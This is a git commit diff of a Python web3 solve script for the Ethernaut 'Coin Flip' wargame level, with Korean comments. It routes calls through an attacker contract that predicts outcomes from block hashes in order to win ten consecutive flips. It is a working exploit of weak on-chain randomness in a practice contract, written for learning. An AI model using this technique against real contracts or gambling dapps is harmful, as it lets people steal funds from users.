8c21270f20542e40b972e000fe75d596a0c4a5a8
swollows <swollows9081@gmail.com>
2025-01-01 00:46:59 +0900

    Modifiy write up (Ethernaut / 03. Coin Flip)

--- Wargame/ethernaut/03_coin_flip/solve.py
+++ Wargame/ethernaut/03_coin_flip/solve.py
@@ -2,7 +2,9 @@ from web3 import Web3
 import time
 
 # 풀이
-# 1. 
+# 1. CoinFlip 컨트랙트를 외부에서 동일한 Random Seed 번호를 이용하여 호출하는 컨트랙트 생성
+# 2. 생성한 컨트랙트로 네트워크의 동일한 블록 번호를 활용한 데이터를 CoinFlip 컨트랙트의 flip 함수에 전달
+# 3. 전달한 데이터로 동전 앞/뒤 정보를 전달하여 10회 검사 통과하기 
 
 # 문제에서 사용하는 각종 정보 추출
 def parse_env_to_dict(env_file_path):
@@ -37,6 +39,7 @@ dict_output = parse_env_to_dict(ENV_PATH)
 RPC_URI = dict_output['WEB3_PROVIDER_URI']
 
 CONTRACT_ADDRESS = '0x25B523D2B08e2E164B772C3580a8d7EFC71A9A4C'
+ATTACKER_ADDRESS = '0x0181090eD3cc1954f8635aFfa7f9B87bDbdc8675'
 PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']
 
 web3 = Web3(Web3.HTTPProvider(RPC_URI))
@@ -87,47 +90,70 @@ CONTRACT_ABI = [
     }
 ]
 
+ATTACKER_ABI = [
+  {
+    "inputs": [
+      {
+        "internalType": "contract CoinFlip",
+        "name": "_coinflipContract",
+        "type": "address"
+      }
+    ],
+    "stateMutability": "nonpayable",
+    "type": "constructor"
+  },
+  {
+    "inputs": [],
+    "name": "consecutiveWins",
+    "outputs": [
+      {
+        "internalType": "uint256",
+        "name": "",
+        "type": "uint256"
+      }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "flip",
+    "outputs": [
+      {
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }
+    ],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }
+]
+
 contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
+attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)
 
-FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968
 TOTAL_WINS = contract.functions.consecutiveWins().call()
-SUCCEEDED_BLOCK_NUM = 0
 
-print(f"Current Total Wins on Start: {TOTAL_WINS}")
+print(f"Current Total Wins : {TOTAL_WINS}")
 
-with open('./succeeded_block_num', mode='r') as f:
-    TMP = int(f.read(), base=10)
-    if TMP != 0:
-        SUCCEEDED_BLOCK_NUM = TMP
-
-while True:
-    BEFORE_WINS = contract.functions.consecutiveWins().call()
-    LAST_BLOCK_NUMBER = web3.eth.get_block_number() - 1
-    LAST_HASH = web3.eth.get_block(LAST_BLOCK_NUMBER)['hash']
-
-    BLOCK_VALUE = int.from_bytes(LAST_HASH, byteorder='big')
-
-    if SUCCEEDED_BLOCK_NUM == LAST_BLOCK_NUMBER:
-        continue
-    
-    COIN_FLIP = BLOCK_VALUE // FACTOR
-    GUESS = COIN_FLIP == 1 if True else False
-    
-    print(f"Last Block Number : {LAST_BLOCK_NUMBER}")
-    print(f"Block Value : {BLOCK_VALUE}")
-    print(f"Block Value // Factor : {COIN_FLIP}")
-    print(f"_guess : {GUESS}")
+for _ in range(10):
+    BASE_FEE = web3.eth.get_block('pending')['baseFeePerGas']
+    PRIORITY_FEE = int(BASE_FEE * 0.15 // 1)
+    CURRENT_NONCE = web3.eth.get_transaction_count(USER_ADDRESS)
 
     # flip 함수 호출하여 동전 면 맞추기
     data = {
         'from': USER_ADDRESS,
         'value': 0,
         'gas': web3.to_wei("0.000000000001", 'ether'),
-        'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
+        'maxPriorityFeePerGas': PRIORITY_FEE,
+        'maxFeePerGas': BASE_FEE + PRIORITY_FEE,
+        'nonce': CURRENT_NONCE,
     }
 
     # 트랜젝션 서명 및 전송
-    tx = contract.functions.flip(GUESS).build_transaction(data)
+    tx = attacker.functions.flip().build_transaction(data)
     signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
     tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
@@ -137,13 +163,8 @@ while True:
     tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
     print(f"Transaction Receipt: {tx_receipt}")
 
-    TOTAL_WINS = contract.functions.consecutiveWins().call()
-    print(f"Current Total Wins: {TOTAL_WINS}")
+TOTAL_WINS = contract.functions.consecutiveWins().call()
+print(f"Current Total Wins: {TOTAL_WINS}")
 
-    if BEFORE_WINS < TOTAL_WINS:
-        SUCCEEDED_BLOCK_NUM = web3.eth.get_block_number() - 1
-        with open('./succeeded_block_num', mode='w') as f:
-            f.write(str(SUCCEEDED_BLOCK_NUM))
-    elif TOTAL_WINS == 10:
-        print("Clear! You wins Coin Flip 10 times!")
-        exit(0)
+if TOTAL_WINS >= 10:
+    print("Attack Successful!")
